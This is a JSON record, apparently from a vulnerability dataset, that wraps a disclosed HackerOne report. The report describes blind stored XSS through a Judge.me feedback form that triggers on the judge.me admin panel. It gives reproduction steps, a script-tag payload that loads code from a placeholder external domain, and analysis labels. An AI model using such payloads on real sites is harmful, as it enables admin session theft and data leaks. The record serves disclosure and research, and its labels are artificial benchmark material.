@@ -1,0 +1,61 @@
+{
+  "reported_to": "Judge.me ",
+  "reported_by": "b3hlull ",
+  "title": "Blind XSS via Feedback form.",
+  "content": "\nSummary:\nHi Team,\nI found Blind XSS which is triggered on the admin panel. I was trying to add widgets on the installation page for default theme. When the installation was done, I saw a question like that Are you happy with how everything looks?. I clicked the No, please remove all widgets button and then the feedback form arrives. I submitted my blind XSS payload. It triggered in 20-30 minutes on https://judge.me/admin which requires the HTTP Basic Authentication. I can't get the admin session cookie but I can collect all of the admin pages.\nSteps To Reproduce:\nGo to https://odo-tester.myshopify.com/admin/ and login with the test credentials. (credentials in the Credentials Header)\nClick the Apps tab from the left side and then click Judge.me Product Reviews.\nClick Add Widgets then Start Installation and continue.\nWhen the installation is done. It asks Are you happy with how everything looks?. Choose No, please remove all widgets button. Feedback form appears and put your blind xss payload.\nWait for payload triggering.\nSupporting Material/References:\nVulnerable Page URL : https://judge.me/admin/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nReferer: https://judge.me/admin/\u2588\u2588\u2588\nCookies:http \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nCredentials\nCode 197 Bytes\n1email:  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588@yopmail.com\n2password: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3tempmail: https://yopmail.com/?judgeme-\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 ( it can be necessary when you are login )\n4payload: \"><script src=https://yourxssdomain></script>\nAdmin Page\n\u2588\u2588\u2588\u2588\u2588\nVulnerable Page\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nSteps to Reproduce Video\n\u2588\u2588\u2588\u2588\nImpact\nBlind XSS leads to access the admin panel. It may contain information leaks about other shop owners' reports. Executes javascript code on admin panel. Stealing admin cookies.\n\n",
+  "severity": [
+    8.0,
+    null
+  ],
+  "bounty": 50,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Stored"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1651584960,
+  "report_url": "https://hackerone.com/reports/1339034",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Go to https://odo-tester.myshopify.com/admin/ and login with the test credentials."
+    ],
+    [
+      2,
+      "Click the Apps tab from the left side and then click Judge.me Product Reviews."
+    ],
+    [
+      3,
+      "Click Add Widgets then Start Installation and continue."
+    ],
+    [
+      4,
+      "When the installation is done, choose 'No, please remove all widgets' button."
+    ],
+    [
+      5,
+      "Submit a blind XSS payload in the feedback form that appears."
+    ],
+    [
+      6,
+      "Wait for the payload to trigger on the admin panel (https://judge.me/admin)."
+    ]
+  ],
+  "vuln_description": "Blind XSS via feedback form that triggers on the admin panel, allowing the attacker to execute JavaScript in the context of the admin panel and potentially access sensitive information.",
+  "reason": "The attack involves navigating through a series of UI interactions and submitting a payload in a feedback form, which is a straightforward process. The blind XSS aspect adds some complexity, but the steps to reproduce are clear and do not involve subtle interactions or complex application states.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The Blind XSS vulnerability involves submitting a payload through a feedback form that triggers in an admin panel, which is a different context from the regular user flow. The methodology described focuses on swapping user sessions and resource IDs within the same application context, but does not account for cross-context vulnerabilities like Blind XSS that rely on admin interaction with user-submitted data.",
+    "is_detectable": false
+  }
+}
